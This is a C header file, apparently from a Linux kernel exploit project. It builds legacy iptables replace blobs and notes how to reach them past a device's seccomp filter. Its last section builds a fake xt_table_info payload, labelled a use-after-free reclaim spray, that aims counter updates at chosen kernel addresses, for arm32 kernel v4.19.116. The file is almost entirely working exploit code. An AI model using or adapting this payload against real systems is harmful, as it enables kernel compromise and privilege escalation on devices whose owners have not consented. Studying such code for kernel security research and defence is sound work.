#ifndef IPT_BLOB_H
#define IPT_BLOB_H
/*
 * ipt_blob.h — generic legacy-iptables blob builder for x_tables kernel research.
 *
 * Builds a valid `struct ipt_replace` for IPT_SO_SET_REPLACE against a live
 * table: one chain per valid hook, `rules_per_hook` unconditional standard-
 * verdict entries followed by the policy entry, plus the mandatory trailing
 * ERROR entry. Also wraps GET_INFO / GET_ENTRIES.
 *
 * Designed to be reusable for any x_tables bug that needs rule blobs: knob is
 * rules_per_hook (drives entry count = per-CPU counter allocations) and the two
 * verdicts. Matches/targets can be attached later without changing the API.
 *
 * Reachability note (measured on the X9): the IPT_SO_* handlers live at
 * SOL_IP level and work on ANY AF_INET socket — no raw socket required (the
 * device seccomp filter blocks SOCK_RAW; a DGRAM socket is what reaches
 * iptables there).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/netfilter.h>
#include <linux/netfilter/x_tables.h>
#include <linux/netfilter_ipv4/ip_tables.h>

/* terminal verdicts, kernel encoding (NF_ACCEPT=1/NF_DROP=0 in UAPI) */
#define BB_VACCEPT (-NF_ACCEPT - 1)
#define BB_VDROP   (-NF_DROP - 1)

static int bb_sock(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		perror("[blob] socket(AF_INET,SOCK_DGRAM)");
	return fd;
}

static int bb_getinfo(int fd, const char *table, struct ipt_getinfo *gi)
{
	memset(gi, 0, sizeof(*gi));
	strncpy(gi->name, table, XT_TABLE_MAXNAMELEN - 1);
	socklen_t len = sizeof(*gi);
	if (getsockopt(fd, IPPROTO_IP, IPT_SO_GET_INFO, gi, &len) != 0)
		return -1;
	return 0;
}

/* malloc'd; caller frees. size taken from gi->size. */
static struct ipt_get_entries *bb_get_entries(int fd, const struct ipt_getinfo *gi)
{
	struct ipt_get_entries *ge = calloc(1, sizeof(*ge) + gi->size);
	if (!ge)
		return NULL;
	strncpy(ge->name, gi->name, XT_TABLE_MAXNAMELEN - 1);
	ge->size = gi->size;
	if (getsockopt(fd, IPPROTO_IP, IPT_SO_GET_ENTRIES, ge,
		       &(socklen_t){ sizeof(*ge) + gi->size }) != 0) {
		fprintf(stderr, "[blob] GET_ENTRIES %s: %s\n", gi->name, strerror(errno));
		free(ge);
		return NULL;
	}
	return ge;
}

/*
 * Build a replace blob for `table`, matching its valid_hooks/num_counters
 * (from a FRESH gi). Returns malloc'd ipt_replace with its own counters array.
 */
static struct ipt_replace *bb_build(const char *table, const struct ipt_getinfo *gi,
				    unsigned rules_per_hook, int verdict, int policy_verdict)
{
	const unsigned entsz = sizeof(struct ipt_entry) +
			       XT_ALIGN(sizeof(struct ipt_standard_target));
	const unsigned errsz = sizeof(struct ipt_entry) +
			       XT_ALIGN(sizeof(struct ipt_error_target));
	unsigned nchains = 0, total_sz = 0, nentries = 0;

	for (unsigned h = 0; h < NF_INET_NUMHOOKS; h++)
		if (gi->valid_hooks & (1U << h)) {
			nchains++;
			total_sz += (rules_per_hook + 1) * entsz;
			nentries += rules_per_hook + 1;
		}
	total_sz += errsz;
	nentries += 1; /* ERROR */

	struct ipt_replace *rep = calloc(1, sizeof(*rep) + total_sz);
	if (!rep)
		return NULL;
	rep->counters = calloc(gi->num_entries, sizeof(struct xt_counters));
	if (!rep->counters) {
		free(rep);
		return NULL;
	}
	strncpy(rep->name, table, XT_TABLE_MAXNAMELEN - 1);
	rep->valid_hooks = gi->valid_hooks;
	rep->num_entries = nentries;
	rep->size = total_sz;
	rep->num_counters = gi->num_entries;

	uint8_t *cur = rep->entries;
	for (unsigned h = 0; h < NF_INET_NUMHOOKS; h++) {
		if (!(gi->valid_hooks & (1U << h)))
			continue;
		rep->hook_entry[h] = cur - (uint8_t *)rep->entries;
		for (unsigned r = 0; r <= rules_per_hook; r++) {
			struct ipt_entry *e = (struct ipt_entry *)cur;
			struct ipt_standard_target *st;
			e->target_offset = sizeof(*e);
			e->next_offset = entsz;
			st = (struct ipt_standard_target *)(cur + e->target_offset);
			st->target.u.user.target_size =
				XT_ALIGN(sizeof(*st));
			/* standard target has the empty name (calloc'd) */
			st->verdict = (r == rules_per_hook) ? policy_verdict : verdict;
			cur += entsz;
		}
		rep->underflow[h] = (cur - (uint8_t *)rep->entries) - entsz; /* policy entry */
	}
	{
		struct ipt_entry *e = (struct ipt_entry *)cur;
		struct ipt_error_target *et;
		e->target_offset = sizeof(*e);
		e->next_offset = errsz;
		et = (struct ipt_error_target *)(cur + e->target_offset);
		et->target.u.user.target_size = XT_ALIGN(sizeof(*et));
		strcpy(et->target.u.user.name, IPT_ERROR_TARGET);
		strcpy(et->errorname, "x9blob");
		cur += errsz;
	}
	if ((unsigned)(cur - (uint8_t *)rep->entries) != total_sz) {
		fprintf(stderr, "[blob] internal size mismatch\n");
		free(rep->counters);
		free(rep);
		return NULL;
	}
	return rep;
}

static int bb_set_replace(int fd, const struct ipt_replace *rep)
{
	return setsockopt(fd, IPPROTO_IP, IPT_SO_SET_REPLACE, rep,
			  sizeof(*rep) + rep->size);
}

static void bb_free_replace(struct ipt_replace *rep)
{
	if (rep) {
		free(rep->counters);
		free(rep);
	}
}

static const char *bb_verdict_name(int v)
{
	static char buf[32];
	if (v == BB_VACCEPT) return "ACCEPT";
	if (v == BB_VDROP)   return "DROP";
	if (v >= 0) { snprintf(buf, sizeof(buf), "JUMP+%d", v); return buf; }
	snprintf(buf, sizeof(buf), "verdict %d", v);
	return buf;
}

/* iterate dumped entries: for (off=0, e=bb_first(ge); off<ge->size; off+=e->next_offset, e=bb_next(e)) */
static inline struct ipt_entry *bb_first(struct ipt_get_entries *ge)
{
	return (struct ipt_entry *)ge->entrytable;
}
static inline struct ipt_entry *bb_next(struct ipt_entry *e)
{
	return (struct ipt_entry *)((uint8_t *)e + e->next_offset);
}

/* ---- UAF reclaim payload (kernel struct xt_table_info is not UAPI;
 * layout measured from v4.19.116 source: entries[] at offset 64 on arm32) */
#define BB_INFO_HDR 64
#define BB_INFO_OFF_SIZE   0
#define BB_INFO_OFF_NUMBER 4

struct bb_fake_ent {
	uint64_t target;      /* absolute kernel VA this entry's pcnt resolves to */
};

/* Build a fake xt_table_info + entry chain for spraying into the freed
 * allocation (sendmsg control-buffer spray). The stale do_add_counters walk
 * checks number, then iterates entries via next_offset, adding the ADDER's
 * paddc deltas to counters resolved as  pcnt_value + percpu_unit_base. */
static void *bb_fake_payload(unsigned fake_number, const struct bb_fake_ent *ents,
			     unsigned n, size_t out_len)
{
	const unsigned esz = sizeof(struct ipt_entry) +
			     XT_ALIGN(sizeof(struct ipt_standard_target));
	uint8_t *buf = calloc(1, out_len);
	if (!buf)
		return NULL;
	*(uint32_t *)(buf + BB_INFO_OFF_SIZE) = n * esz; /* walk range */
	*(uint32_t *)(buf + BB_INFO_OFF_NUMBER) = fake_number;
	uint8_t *cur = buf + BB_INFO_HDR;
	for (unsigned i = 0; i < n; i++) {
		struct ipt_entry *e = (struct ipt_entry *)cur;
		struct ipt_standard_target *st;
		e->target_offset = sizeof(*e);
		e->next_offset = esz;
		e->counters.pcnt = (uint64_t)(uint32_t)ents[i].target; /* + unit_base at resolve */
		e->counters.bcnt = 0;
		st = (struct ipt_standard_target *)(cur + e->target_offset);
		st->target.u.user.target_size = XT_ALIGN(sizeof(*st));
		st->verdict = 0;
		cur += esz;
	}
	return buf;
}
#endif /* IPT_BLOB_H */
